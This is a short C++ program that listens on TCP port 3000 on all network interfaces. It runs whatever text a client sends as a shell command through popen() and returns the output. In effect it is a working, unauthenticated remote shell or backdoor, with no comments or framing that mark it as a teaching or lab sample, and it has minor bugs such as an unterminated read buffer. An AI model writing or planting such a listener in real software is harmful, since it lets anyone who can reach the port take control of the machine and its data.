#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string>
#include <array>

using namespace std;

void error(char *msg) {
    perror(msg);
    exit(-1);
}

const int SERVER_PORT = 3000;

string exec(const char* cmd) {
    char buffer[128];
    string result = "";
    FILE* pipe = popen(cmd, "r");
    if (!pipe) error("popen() failed");
    try {
        while (!feof(pipe)) {
            if (fgets(buffer, 128, pipe) != NULL)
                result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        throw;
    }
    pclose(pipe);
    return result;
}

int main(int argc, char const *argv[]) {
    int serverFd, newSocket;
    char buffer[1024] = {0};
    struct sockaddr_in address;
    int addrlen = sizeof(address);
    int n;

    // Creating socket file descriptor
    if ((serverFd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        error("Error opening socket");
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(SERVER_PORT);

    // Forcefully attaching socket to SERVER_PORT
    if (bind(serverFd, (struct sockaddr *) &address, sizeof(address)) < 0) {
        error("Error binding socket");
    }
    if (listen(serverFd, 3) < 0) {
        error("Error listening socket");
    }
    while ((newSocket = accept(serverFd, (struct sockaddr *)&address, (socklen_t *)&addrlen)) >= 0) {
        n = read(newSocket, buffer, 1024);
        printf("Server got: %s\n", buffer);
        string result = exec(buffer);
        write(newSocket, result.c_str(), result.size());

        close(newSocket);
    }
    error("Error accepting");

    return 0;
}